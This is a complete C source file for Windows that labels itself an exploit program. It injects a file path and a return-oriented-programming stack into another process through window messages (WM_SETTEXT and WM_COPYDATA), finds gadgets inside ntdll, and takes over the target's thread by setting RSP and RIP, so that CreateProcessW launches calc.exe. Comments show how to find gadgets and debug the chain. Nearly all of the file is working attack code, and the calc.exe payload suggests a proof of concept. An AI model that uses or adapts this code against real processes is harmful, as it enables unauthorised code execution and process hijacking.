#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>

#pragma comment(lib, "shlwapi.lib")

/*
this program inject/insert CreateProcessW path
into another process TARGETPROC
generate a ROP stack that call CreateProcessW
inject this ROP stack into TARGETPROC
suspend main thread of TARGETPROC
change the RSP of the thread to the address where the ROP stack was injected
change the RIP of the thread to the first ROP gadget
resume the thread and the ROP stack is executed

Those are two tools commands for finding ROP gadgets
depth is the maximum number of instructions that the gadget can have
-r3 is same as depth the maximum number of instructions that the gadget can have
ROPgadget --depth 10 --rawArch x86 --rawMode 64 --binary
C:\Windows\SysWOW64\ntdll.dll > ntdll.txt
.\rp-win.exe -f \Windows\System32\ntdll.dll -r3 --colors

another useful tool is this web assembler/disassembler
https://defuse.ca/online-x86-assembler.htm

To get better insight is interesting to see the assembly code of the target
one way to do it is in to launch the target proccess without a debugger
and put a breakpoint in this program just before the suspend thread will
be resumed that line is ResumeThread(thandle);
so the program RIP will be exactly where the ROP will start, attach the a
debugguer to the targetprocess example x64, so in the debugguer of the target
process put a breakpoint in the RIP, resume all threads and click the windows
target process to resume the thread and debug the ROP.

If you press continue/run in the debugguer without having a breakpoint in the
RIP, you will probably gonna stop in another instruction even if you put the
breakpoint in the current RIP.

Another thing you can do is to create a short program that call CreateProcessW
and observe the assembly code to compare with your ROP.
*/

// is important to make the stack the exact size and position for arguments
// in this case are 18 items

/*
this ROP put CreateProcessW address in RAX and setup
its parameters, finally it do a jmp rax that call CreateProcessW

stack
0 CreateProcessW address (pop rax)
CreateProcessW arguments
1 lpCommandLine = NULL (pop rdx)
2 lpFile = injectedPath (pop rcx)
3 lpProcessAttributes = NULL (pop r8)
4 lpThreadAttributes = NULL (pop r9)
5 NULL (pop r10)
6 NULL (pop r11)
7 ROP2
8 0 (ExitProcess argument)
9 ROP3
10 0
11 0
12 ExitProcess address
13 0
14 0
15 0
16 startupinfo (CreateProcessW argument)
17 procinfo (CreateProcessW argument)

0:  58                      pop    rax
1:  5a                      pop    rdx
2:  59                      pop    rcx
3:  41 58                   pop    r8
4:  41 59                   pop    r9
5:  41 5a                   pop    r10
6:  41 5b                   pop    r11
7:  48 ff e0                jmp    rax
*/
#define ROP1 "\x58\x5A\x59\x41\x58\x41\x59\x41\x5A\x41\x5B\x48\xff\xe0"

/*
this ROP setup the argument for ExitProcess

stack after pop -7 from previous ROP
0 ExitProcess(0) (argument pop rcx)
1 ROP3
2 0
3 0
4 ExitProcess address
5 0
6 0
7 0
8 startupinfo (CreateProcessW argument)
9 procinfo (CreateProcessW argument)

0:  59                      pop    rcx
1:  c3                      ret
*/
#define ROP2 "\x59\xc3"

/*
this ROP3 is use to avoid an exception for reason that I don't know
the problem seems with
sub rsp,0x20
before the call to ExitProcess

stack after pop -1 from previous ROP
0 0
1 0
2 ExitProcess address
3 0
4 0
5 0
6 startupinfo (CreateProcessW argument)
7 procinfo (CreateProcessW argument)

after
add    rsp,0x10
stack
0 ExitProcess address
1 0
2 0
3 0
4 startupinfo (CreateProcessW argument)
5 procinfo (CreateProcessW argument)

0:  48 83 c4 10             add    rsp,0x10
4:  c3                      ret
*/
#define ROP3 "\x48\x83\xc4\x10\xc3"

#define NOT_FOUND -1
#define CREATEPROCESSPATH L"C:\\Windows\\System32\\calc.exe"
#define TARGETPROC L"Target_Process.exe"

typedef struct {
  WCHAR buffer[MAX_PATH];
  size_t size;
} BUFFER;

typedef struct {
  LPCVOID MatchAddress[256];
  int MatchAddressCount;
  char *lookingBytesSequence;
  size_t lookingBytesSequenceSize;
  DWORD pid;
} MemoryMatch;

typedef struct {
  ULONG_PTR injectedPathaddr;
  ULONG_PTR rop1;
  ULONG_PTR rop2;
  ULONG_PTR rop3;
  ULONG_PTR WritableMemaddr;
  MemoryMatch memoryMatch;
} ROPStruct;

BUFFER CreateProcessPath = {.buffer = CREATEPROCESSPATH,
                            .size = sizeof(CREATEPROCESSPATH)};

typedef struct {
  ROPStruct *ROPInfo;
  BOOL success;
} ROPInfoAndSuccess;

HWND hgwnd;
HBITMAP hgbmp;

void SearchROP(ROPStruct *ROPInfo);

void GenerateROPStack(ROPStruct *ROPInfo);

int isZeroMem(char *buf, unsigned int size);

size_t searchBytesPattern(char *mem, size_t memSize, char *lookingBytesSequence,
                          size_t lookingBytesSequenceSize);

HANDLE GetPidByName(char *name);

HANDLE OpenSuspendThread(DWORD pid, BOOL suspend);

ULONG_PTR GetAnyAlignedWritableZeroMemAddr(DWORD pid);

void SearchProcessMemForPattern(wchar_t *procName, MemoryMatch *memoryMatch);

BOOL isInMemory(LPCVOID bufferAddrInTargetProc, SIZE_T bufferToSearchSize,
                LPCVOID bufferToSearch, HANDLE hProc);

BOOL SetROP(MemoryMatch *pathInfo, ROPStruct *ROPInfo);

void ExecuteROP(ROPStruct *ROPInfo, MemoryMatch *pathToSearch);

void MainExploit();

BOOL NotIsTargetProcessFunc(HWND hWnd, BOOL *success);

BOOL CALLBACK EnumWindowsProcCopyData(HWND hWnd, LPARAM lParam);

BOOL CALLBACK EnumWindowsProcSetText(HWND hWnd, LPARAM lParam);

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

void ErrorOpenProcess(BOOL success);

void DoInjectPath();

void DoInjectROPStack(ROPStruct *ROPInfo);

void SetRopStack(ULONG_PTR *lookingBytesSequence, size_t index,
                 ULONG_PTR value);

inline int GetIndex();

void debug_info();

HWND CreateCenteredWindow(HINSTANCE hInstance);

inline int GetIndex() {
  // Static variable to hold the current index
  static int index = 0;
  return index++;
}

// cast lookingBytesSequence to ULONG_PTR*
void SetRopStack(ULONG_PTR *lookingBytesSequence, size_t index,
                 ULONG_PTR value) {
  *&lookingBytesSequence[index] = value;
}

void SearchROP(ROPStruct *ROPInfo) {
  unsigned char *pntdll = GetModuleHandleW(L"ntdll.dll");
  for (ULONG i = 0; i < 0x100000; i++) {
    if (!memcmp(&pntdll[i], ROP1, sizeof(ROP1) - 1)) {
      ROPInfo->rop1 = &pntdll[i]; //  rop1
    }

    if (!memcmp(&pntdll[i], ROP2, sizeof(ROP2) - 1)) {
      ROPInfo->rop2 = &pntdll[i]; //  rop2
    }

    if (!memcmp(&pntdll[i], ROP3, sizeof(ROP3) - 1)) {
      ROPInfo->rop3 = &pntdll[i]; //  rop3
    }

    if (ROPInfo->rop1 && ROPInfo->rop2 && ROPInfo->rop3)
      break;
  }
}

void GenerateROPStack(ROPStruct *ROPInfo) {
  HMODULE pker = GetModuleHandleW(L"kernel32.dll");
  if (pker == 0) {
    __debugbreak();
    debug_info();
  }
  ULONG_PTR pcreateproc = (ULONG_PTR)GetProcAddress(pker, "CreateProcessW");
  ULONG_PTR pexitproc = GetProcAddress(pker, "ExitProcess");

  SearchROP(ROPInfo);

  // To CreateProcessW works the stack must have exact this size
  // and the arguments must be in this exact position

  // pop rax = addr of CreateProcessW (later jmp rax)
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(),
              pcreateproc); // 0
  // pop rdx = lpCommandLine = NULL
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 1
  // pop rcx = lpFile = injectedPath
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(),
              ROPInfo->injectedPathaddr); // 2
  // pop r8 = process sec attr
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 3
  // pop r9 = thread sec attr
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 4
  // pop r10 trash
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 5
  // pop r11 trash
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 6
  // ROP2
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(),
              ROPInfo->rop2); // 7
  // ExitProcess(0) argument
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 8
  // ROP3
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(),
              ROPInfo->rop3); // 9

  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 10
  // space parameters to the callee
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 11
  // ExitProcess (restart target)
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(),
              pexitproc); // 12
  //  creation flags
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 13
  //  pEnvironment
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 14
  //  curdir
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(), 0); // 15
  //  out startupinfo
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(),
              ROPInfo->WritableMemaddr); // 16
  //  out procinfo
  SetRopStack(ROPInfo->memoryMatch.lookingBytesSequence, GetIndex(),
              ROPInfo->WritableMemaddr); // 17
}

int isZeroMem(char *buf, unsigned int size) {
  for (unsigned int i = 0; i < size; i++) {
    if (buf[i])
      return 0;
  }
  return 1;
}

size_t searchBytesPattern(char *mem, size_t memSize, char *lookingBytesSequence,
                          size_t lookingBytesSequenceSize) {
  if (memSize < lookingBytesSequenceSize)
    return NOT_FOUND;

  size_t memOffset = 0;
  size_t searchBoundary = memOffset + lookingBytesSequenceSize;

  while (searchBoundary <= memSize) {
    if (memcmp(&mem[memOffset], lookingBytesSequence,
               lookingBytesSequenceSize) == 0)
      return memOffset;

    searchBoundary = ++memOffset + lookingBytesSequenceSize;
  }
  return NOT_FOUND;
}

HANDLE GetPidByName(char *name) {
  PROCESSENTRY32 pe32 = {0};
  SYSTEM_INFO si;
  DWORD retHandle = 0;

  GetSystemInfo(&si);

  HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE)
    return;

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(hProcessSnap, &pe32)) {
    CloseHandle(hProcessSnap);
    debug_info();
  }

  do {
    BOOL processHaveName = !_strnicmp(pe32.szExeFile, name, strlen(name));
    if (processHaveName) {
      retHandle = pe32.th32ProcessID;
      break;
    }

  } while (Process32NextW(hProcessSnap, &pe32));

  CloseHandle(hProcessSnap);

  return retHandle;
}

// open any thread or suspend all threads
HANDLE OpenSuspendThread(DWORD pid, BOOL suspend) {
  THREADENTRY32 te32 = {0};

  HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    __debugbreak();
    debug_info();
  }

  te32.dwSize = sizeof(THREADENTRY32);

  if (!Thread32First(hProcessSnap, &te32)) {
    __debugbreak();
    debug_info();
  }

  do {
    if (te32.th32OwnerProcessID == pid) {
      HANDLE hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
      if (hthread) {
        if (suspend) {
          SuspendThread(hthread);
          CloseHandle(hthread);
        }

        if (!suspend) {
          return hthread;
        }
      }
      if (hthread != NULL)
        CloseHandle(hthread);
    }

  } while (Thread32Next(hProcessSnap, &te32));

  CloseHandle(hProcessSnap);
  return NULL;
}

ULONG_PTR GetAnyAlignedWritableZeroMemAddr(DWORD pid) {
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  if (!hProcess)
    return 0;

  SYSTEM_INFO si = {0};
  GetSystemInfo(&si);
  PCHAR lpMem = 0;
  ULONG_PTR result = 0;

  while (lpMem < si.lpMaximumApplicationAddress) {
    MEMORY_BASIC_INFORMATION mbi = {0};
    VirtualQueryEx(hProcess, lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
    if ((mbi.State & MEM_COMMIT) && mbi.Protect == PAGE_READWRITE ||
        mbi.Protect == PAGE_EXECUTE_READWRITE) {
      PCHAR ProcessBytes = malloc(mbi.RegionSize);
      if (!ProcessBytes)
        continue;

      SIZE_T NumberOfBytesRead = 0;
      if (ReadProcessMemory(hProcess, mbi.BaseAddress, ProcessBytes,
                            mbi.RegionSize, &NumberOfBytesRead)) {
        for (ULONG_PTR i = 0; i < mbi.RegionSize - sizeof(STARTUPINFOW) - 1;
             i++) {
          BOOL isEightByteAligned = !(((ULONG_PTR)(lpMem + i)) % 8);
          if (isEightByteAligned &&
              isZeroMem(&ProcessBytes[i], sizeof(STARTUPINFOW))) {
            free(ProcessBytes);
            result = lpMem + i;
            goto finish;
          }
        }
      }
      free(ProcessBytes);
    }
    lpMem = (PVOID)((ULONG_PTR)mbi.BaseAddress + (ULONG_PTR)mbi.RegionSize);
  }
finish:
  CloseHandle(hProcess);
  return result;
}

void SearchProcessMemForPattern(wchar_t *procName, MemoryMatch *memoryMatch) {
  HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  HANDLE hProcess = NULL;
  PROCESSENTRY32W pe32 = {0};
  pe32.dwSize = sizeof(PROCESSENTRY32W);
  MEMORY_BASIC_INFORMATION mbi = {0};

  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    __debugbreak();
    debug_info();
  }

  if (!Process32FirstW(hProcessSnap, &pe32)) {
    CloseHandle(hProcessSnap);
    return;
  }

  do {
    BOOL isTargetProcess =
        _wcsnicmp(pe32.szExeFile, procName, wcslen(procName)) == 0;
    if (isTargetProcess) {
      hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
      if (!hProcess) {
        __debugbreak();
        debug_info();
      }

      LPCVOID queryAddress = 0;
      SYSTEM_INFO si = {0};
      GetSystemInfo(&si);
      // Loop program memory
      while (queryAddress < si.lpMaximumApplicationAddress) {
        if (!VirtualQueryEx(hProcess, queryAddress, &mbi,
                            sizeof(MEMORY_BASIC_INFORMATION))) {
          __debugbreak();
          debug_info();
        }
        if (!(mbi.State & MEM_FREE) && mbi.RegionSize < 0x2000000) {
          PVOID liveMemory = NULL;
          SIZE_T liveMemorySize = 0;
          if (liveMemory = malloc(mbi.RegionSize)) {
            liveMemorySize = mbi.RegionSize;
            if (!ReadProcessMemory(hProcess, mbi.BaseAddress, liveMemory,
                                   mbi.RegionSize, &liveMemorySize)) {
              DWORD error = GetLastError();
              if (error != ERROR_PARTIAL_COPY) {
                __debugbreak();
                debug_info();
              }
            }
            size_t memOffset;
            if ((memOffset = searchBytesPattern(
                     liveMemory, liveMemorySize,
                     memoryMatch->lookingBytesSequence,
                     memoryMatch->lookingBytesSequenceSize)) != NOT_FOUND) {
              //  Pattern found
              if (memoryMatch->MatchAddressCount <
                  sizeof(memoryMatch->MatchAddress)) {
                memoryMatch->MatchAddress[memoryMatch->MatchAddressCount] =
                    (char *)queryAddress + memOffset;
                memoryMatch->MatchAddressCount++;
              }
            }
            free(liveMemory);
          }
        }
        queryAddress =
            (LPCVOID)((ULONG_PTR)mbi.BaseAddress + (ULONG_PTR)mbi.RegionSize);
      }
      CloseHandle(hProcess);
    }

  } while (memoryMatch->MatchAddressCount == 0 &&
           Process32Next(hProcessSnap, &pe32));

  BOOL patterFound = memoryMatch->MatchAddressCount == 0;
  if (patterFound) {
    __debugbreak();
    WCHAR msg[256] = {0};
    swprintf(msg, sizeof(msg) / sizeof(WCHAR), L"Bytes: %s not found",
             (WCHAR *)memoryMatch->lookingBytesSequence);
    MessageBoxW(NULL, msg, L"Error", MB_ICONERROR | MB_OK);
    exit(EXIT_FAILURE);
  }

  memoryMatch->pid = pe32.th32ProcessID;

  CloseHandle(hProcessSnap);
}

BOOL isInMemory(LPCVOID bufferAddrInTargetProc, SIZE_T bufferToSearchSize,
                LPCVOID bufferToSearch, HANDLE hProc) {
  CHAR ReadMemBuffer[512] = {0};
  SIZE_T LiveMemReadBytes = 0;
  ReadProcessMemory(hProc, bufferAddrInTargetProc, ReadMemBuffer,
                    bufferToSearchSize, &LiveMemReadBytes);

  return memcmp(ReadMemBuffer, (char *)bufferToSearch, bufferToSearchSize) == 0;
}

BOOL SetROP(MemoryMatch *pathInfo, ROPStruct *ROPInfo) {
  BOOL result = FALSE;

  for (unsigned int i = 0; i < pathInfo->MatchAddressCount; i++) {
    ROPInfo->injectedPathaddr = pathInfo->MatchAddress[i];
    GenerateROPStack(ROPInfo);
    DoInjectROPStack(ROPInfo);
    Sleep(500); //  wait for the injection to be set/ready

    // look for the full ROP stack in targetproc
    SearchProcessMemForPattern(TARGETPROC, &ROPInfo->memoryMatch);

    HANDLE hProc =
        OpenProcess(PROCESS_ALL_ACCESS, FALSE, ROPInfo->memoryMatch.pid);
    if (!hProc) {
      __debugbreak();
      debug_info();
    }
    ROPInfo->WritableMemaddr =
        GetAnyAlignedWritableZeroMemAddr(ROPInfo->memoryMatch.pid);

    BOOL isROPInfoInMem =
        isInMemory(ROPInfo->memoryMatch.MatchAddress[i],
                   ROPInfo->memoryMatch.lookingBytesSequenceSize,
                   ROPInfo->memoryMatch.lookingBytesSequence, hProc);
    BOOL isPathInMem =
        isInMemory(pathInfo->MatchAddress[i], CreateProcessPath.size,
                   CreateProcessPath.buffer, hProc);
    CloseHandle(hProc);

    if (isROPInfoInMem && isPathInMem) {
      result = TRUE;
      break;
    }
  }
  return result;
}

void ExecuteROP(ROPStruct *ROPInfo, MemoryMatch *pathToSearch) {
  OpenSuspendThread(GetPidByName(TARGETPROC), TRUE);

  for (unsigned int i = pathToSearch->MatchAddressCount - 1; i != -1; i--) {
    HANDLE thandle = OpenSuspendThread(pathToSearch->pid, FALSE);
    if (!thandle) {
      __debugbreak();
      debug_info();
    }
    CONTEXT c = {0};
    SuspendThread(thandle);
    c.ContextFlags = CONTEXT_ALL;
    GetThreadContext(thandle, &c);
    c.Rsp = ROPInfo->memoryMatch.MatchAddress[i]; //  rop
    c.Rip = ROPInfo->rop1; // ntdll code to start execution
    SetThreadContext(thandle, &c);
    ResumeThread(thandle);
    CloseHandle(thandle);
  }
}

void MainExploit() {
  char ROPInfoBuffer[256] = {0};
  ROPStruct ROPInfo = {
      .injectedPathaddr = 0,
      .rop1 = NULL,
      .rop2 = NULL,
      .rop3 = NULL,
      .WritableMemaddr = 0,
      .memoryMatch = {.MatchAddress = {0},
                      .MatchAddressCount = 0,
                      .lookingBytesSequence = ROPInfoBuffer,
                      .lookingBytesSequenceSize = sizeof(ROPInfoBuffer),
                      .pid = 0}};

  // this is the path argument of CreateProcessW
  MemoryMatch pathToSearch = {
      .MatchAddress = {0},
      .MatchAddressCount = 0,
      .lookingBytesSequence = (char *)CreateProcessPath.buffer,
      .lookingBytesSequenceSize = CreateProcessPath.size,
      .pid = 0};
  // this inject/insert the path to TARGETPROC
  DoInjectPath();
  Sleep(500); // wait for the injection to be set/ready
  // sometimes for reasons that I don't know the process can have unrelated
  // strings already in int like Notepad or C:\Windows\System32\notepad.exe
  SearchProcessMemForPattern(TARGETPROC, &pathToSearch);
  ROPInfo.WritableMemaddr = GetAnyAlignedWritableZeroMemAddr(pathToSearch.pid);

  if (!SetROP(&pathToSearch, &ROPInfo)) {
    MessageBoxW(
        0, L"Error in setting ROP check that this program is not open twice",
        L"ERROR", MB_ICONERROR | MB_OK);
    exit(EXIT_FAILURE);
  }

  ExecuteROP(&ROPInfo, &pathToSearch);
}

BOOL NotIsTargetProcessFunc(HWND hWnd, BOOL *success) {
  DWORD pid = 0;

  GetWindowThreadProcessId(hWnd, &pid);
  HANDLE h =
      OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
  if (!h)
    return TRUE;

  WCHAR fname[MAX_PATH] = {0};

  BOOL IsTargetProcess = K32GetProcessImageFileNameW(h, fname, MAX_PATH) &&
                         StrStrIW(fname, TARGETPROC);
  if (IsTargetProcess) {
    *success = TRUE;
    CloseHandle(h);
    return FALSE;
  }

  CloseHandle(h);

  return TRUE;
}

BOOL CALLBACK EnumWindowsProcCopyData(HWND hWnd, LPARAM lParam) {
  ROPInfoAndSuccess *ROPInfo_success = (struct ROPInfoAndSuccess *)lParam;
  BOOL NotIsTargetProcess =
      NotIsTargetProcessFunc(hWnd, &ROPInfo_success->success);

  if (!NotIsTargetProcess) {
    COPYDATASTRUCT CDS = {0};
    CDS.cbData = ROPInfo_success->ROPInfo->memoryMatch.lookingBytesSequenceSize;
    CDS.lpData = ROPInfo_success->ROPInfo->memoryMatch.lookingBytesSequence;
    if (!SendMessageW(hWnd, WM_COPYDATA, (WPARAM)hgwnd, (LPARAM)&CDS)) {
      debug_info();
    }
  }
  return NotIsTargetProcess;
}

BOOL CALLBACK EnumWindowsProcSetText(HWND hWnd, LPARAM lParam) {
  BOOL *success = (BOOL *)lParam;
  BOOL NotIsTargetProcess = NotIsTargetProcessFunc(hWnd, success);
  if (!NotIsTargetProcess) {
    if (!SendMessageW(hWnd, WM_SETTEXT, 0, (LPARAM)CreateProcessPath.buffer)) {
      debug_info();
    }
  }
  return NotIsTargetProcess;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam,
                         LPARAM lParam) {
  switch (message) {
  case WM_CLOSE:
    PostQuitMessage(0);
    break;
  default:
    return DefWindowProc(hWnd, message, wParam, lParam);
  }
  return 0;
}

void ErrorOpenProcess(BOOL success) {
  if (!success) {
    MessageBoxW(NULL, L"Failed " TARGETPROC L" must be open", L"Error",
                MB_ICONERROR | MB_OK);
    exit(EXIT_FAILURE);
  }
}

void DoInjectPath() {
  BOOL success = FALSE;
  EnumChildWindows(NULL, (WNDENUMPROC)EnumWindowsProcSetText, (LPARAM)&success);
  ErrorOpenProcess(success);
}

void DoInjectROPStack(ROPStruct *ROPInfo) {
  ROPInfoAndSuccess ROPInfo_success = {.ROPInfo = ROPInfo, .success = FALSE};
  EnumChildWindows(NULL, (WNDENUMPROC)EnumWindowsProcCopyData,
                   (LPARAM)&ROPInfo_success);
  ErrorOpenProcess(ROPInfo_success.success);
}

void debug_info() {
  const LPCVOID no_source = NULL;

  const DWORD error_code = GetLastError();

  const DWORD default_language = 0;

  LPWSTR error_msg_buffer;

  const DWORD min_error_msg_buffer_size = 0;

  va_list *const no_arguments = NULL;

  FormatMessage(
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
          FORMAT_MESSAGE_IGNORE_INSERTS,
      no_source, error_code, default_language,
      (LPWSTR)&error_msg_buffer, //  it expect LPTSTR* casted to LPTSTR
      min_error_msg_buffer_size, no_arguments);

  wchar_t errorMsg[256] = {0};
  if (!error_msg_buffer) {
    swprintf(errorMsg, sizeof(errorMsg) / sizeof(wchar_t),
             L"Format message failed error code: %lu", error_code);
  }

  if (error_msg_buffer) {
    swprintf(errorMsg, sizeof(errorMsg) / sizeof(wchar_t),
             L"Error code: %lu (%s)", error_code, error_msg_buffer);
  }

  MessageBoxW(NULL, errorMsg, L"Error", MB_ICONERROR | MB_OK);
  exit(EXIT_FAILURE);
}

HWND CreateCenteredWindow(HINSTANCE hInstance) {
  WNDCLASS wc = {0};
  const wchar_t CLASS_NAME[] = L"Exploit program";
  wc.lpfnWndProc = WndProc;
  wc.hInstance = hInstance;
  wc.lpszClassName = CLASS_NAME;

  if (!RegisterClassW(&wc)) {
    debug_info();
  }

  // Get the screen dimensions
  int screenWidth = GetSystemMetrics(SM_CXSCREEN);
  int screenHeight = GetSystemMetrics(SM_CYSCREEN);

  // Define the window dimensions
  int windowWidth = 330;
  int windowHeight = 200;

  // Calculate the position to center the window
  int windowX = (screenWidth - windowWidth) / 2;
  int windowY = (screenHeight - windowHeight) / 2;
  return CreateWindowExW(0,                   // Optional window styles.
                         CLASS_NAME,          // Window class
                         CLASS_NAME,          // Window text
                         WS_OVERLAPPEDWINDOW, // Window style

                         // Size and position
                         windowX, windowY, windowWidth, windowHeight,

                         NULL,      // Parent window
                         NULL,      // Menu
                         hInstance, // Instance handle
                         NULL       // Additional application data
  );
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
                    _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) {
  (void)hPrevInstance;
  (void)lpCmdLine;

  HWND hgwnd = CreateCenteredWindow(hInstance);
  ShowWindow(hgwnd, nCmdShow);
  MainExploit();

  return 0;
}
